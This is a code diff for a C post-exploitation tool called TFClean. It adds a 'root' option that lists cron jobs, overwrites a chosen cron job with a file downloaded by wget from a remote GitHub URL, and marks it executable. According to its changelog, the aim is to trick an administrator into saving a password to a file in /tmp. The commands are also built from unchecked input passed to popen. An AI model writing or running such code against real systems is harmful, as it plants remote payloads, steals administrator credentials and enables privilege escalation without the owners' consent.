@@ -4,7 +4,9 @@
    | |he  |  __|ail| |ollective     
    | |    | |      | |____ 
    |_|    |_|       \_____|
-Version 1.0 - TFClean
+Version 1.1 - TFClean
+[+]added a one way to root(trick admin into saving his password into /tmp/ext_check.tmp)
+[-]still staying as TFClean untill more is added,name will change after that. 
 */
 
 #include <stdio.h>
@@ -64,7 +66,73 @@ do {
 			pclose(fpipe);
 		}
 
-	}//end clear command
+	}//end clear
+
+	else if (strcmp(option, "root") == 0)
+	{
+		printf("[INFO]creating a fake cronjob(maybe)\n\nGetting cronjobs:\n");
+		strcpy(command, "crontab -l");
+		if ( !(fpipe = (FILE*)popen(command,"r")) )
+                        {
+                                perror("Problems with command");
+                        }
+		while ( fgets( line, sizeof line, fpipe))
+	                {
+				printf("%s", line);
+			}
+                	pclose(fpipe);
+		printf("\nInput the location of the editabe cronjob(if no jobs leave blank): ");
+		
+		if (fgets(line, sizeof(line), stdin)) {
+	                if (1 == sscanf(line, "%s", variable[0])) {
+                	}
+		}
+		strcpy(command, "cp ");
+		strcat(command, variable[0]);
+		strcat(command, " ");
+		strcat(command, variable[0]);
+		strcat(command, ".tmp");
+		if ( !(fpipe = (FILE*)popen(command,"r")) )
+                {
+                        perror("Problems with command");
+                }
+
+                while ( fgets( line, sizeof line, fpipe))
+                {
+                        printf("%s", line);
+
+                }
+                pclose(fpipe); // close backup create pipe
+		strcpy(command, "wget ");
+		strcpy(variable[1], "raw.github.com/TheFailCollective/TFClean/master/cron -O ");
+		strcat(variable[1], variable[0]);
+		strcat(command, variable[1]);
+		if ( !(fpipe = (FILE*)popen(command,"r")) )
+                {
+                        perror("Problems with command");
+                }
+
+                while ( fgets( line, sizeof line, fpipe))
+                {
+                        printf("%s", line);
+                }
+                pclose(fpipe); //close wget pipe
+		strcpy(command, "chmod +x ");
+		strcat(command, variable[0]);
+		if ( !(fpipe = (FILE*)popen(command,"r")) )
+                {
+                        perror("Problems with command");
+                }
+
+                while ( fgets( line, sizeof line, fpipe))
+                {
+                        printf("%s", line);
+                }
+                pclose(fpipe);//close chmod pipe
+
+        }
+
+
 
 	else if (strcmp(option, "exit") == 0)
 	{
@@ -80,7 +148,7 @@ do {
 		while ( fgets( line, sizeof line, fpipe))
                 {
 			printf("%s", line);
-                	
+
 		}
                 pclose(fpipe);
 	}//end else
@@ -89,3 +157,4 @@ do {
 }while (x < 1); //end first while
 return 0;
 }
+
